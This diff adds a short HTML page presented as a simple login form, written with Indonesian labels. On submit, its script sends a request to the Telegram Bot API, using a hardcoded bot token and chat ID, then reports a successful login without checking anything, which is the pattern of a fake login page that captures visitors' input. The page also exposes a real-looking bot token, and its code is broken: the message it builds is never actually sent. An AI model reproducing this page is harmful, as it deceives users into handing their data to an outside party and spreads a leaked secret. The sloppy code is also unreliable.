@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login Sederhana</title>
+</head>
+<body>
+
+<h2>Login</h2>
+
+<form id="loginForm">
+  <input type="text" id="username" placeholder="Username" required><br><br>
+  <button type="submit">Login</button>
+</form>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  let username = document.getElementById("username").value;
+
+  let token = "TOKEN_BOT_KAMU";
+  let chat_id = "CHAT_ID_KAMU";
+  let message = "User login: " + username;
+
+  fetch(`https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage?chat_id=6297122078&text=`);
+  
+  alert("Login berhasil!");
+});
+</script>
+
+</body>
+</html>
